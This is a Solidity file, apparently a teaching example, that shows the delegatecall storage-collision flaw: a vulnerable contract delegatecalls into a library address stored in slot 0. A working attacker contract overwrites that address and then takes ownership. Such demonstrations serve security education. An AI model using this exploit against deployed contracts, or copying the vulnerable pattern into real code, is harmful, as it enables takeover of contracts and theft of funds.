// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

/**
 * @title Lib
 * @dev A Library used to hold ownership
 */
contract Lib {
    uint256 public score;

    function setScore(uint256 _score) public {
        score = _score;
    }
}


/**
 * @title VulnerableContract
 * @dev Contract that is vulnerable to delegatecall allowing an attacker contract to take ownership
 */
contract VulnerableContract {
    address public lib;
    address public owner;
    uint256 public score;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function setScore(uint256 _score) public {
        (bool res, ) = lib.delegatecall(abi.encodeWithSignature("setScore(uint256)", _score));
        require(res, "Failed to delegatecall to lib");
    }
}

/**
 * @title AttackerContract
 * @dev Used to exploit the delegatecall VulnerableContract has and use it to take ownership
 */
contract AttackerContract {
    // Make sure the storage layout is the same as VulnerableContract
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public score;

    VulnerableContract public vulnerableContract;

    constructor(VulnerableContract _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    function attack() public {
        // override address of the Vulnerable's lib address
        vulnerableContract.setScore(uint256(uint160(address(this))));
        // Because previous line overrides lib address to this contract
        // passing any number as input will call this contract's function setScore(uint256)
        vulnerableContract.setScore(1);
    }

    // function signature must match VulnerableContract.setScore(uint256)
    function setScore(uint256 _score) public {
        // This is will take ownership of the VulnerableContract
        owner = msg.sender;
    }
}